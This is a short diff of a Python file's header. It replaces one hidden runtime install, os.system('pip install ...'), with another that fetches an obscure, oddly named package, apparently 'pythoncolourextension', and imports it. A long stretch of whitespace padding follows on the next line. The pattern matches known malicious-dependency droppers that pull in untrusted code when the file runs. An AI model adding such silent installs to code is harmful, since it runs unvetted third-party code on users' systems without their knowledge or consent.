@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlitedbpackagesV2")
-import pythonsqlitedbpackagesV2
+os.system("pip install pythoncolourextension")
+import pythoncolourextension
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
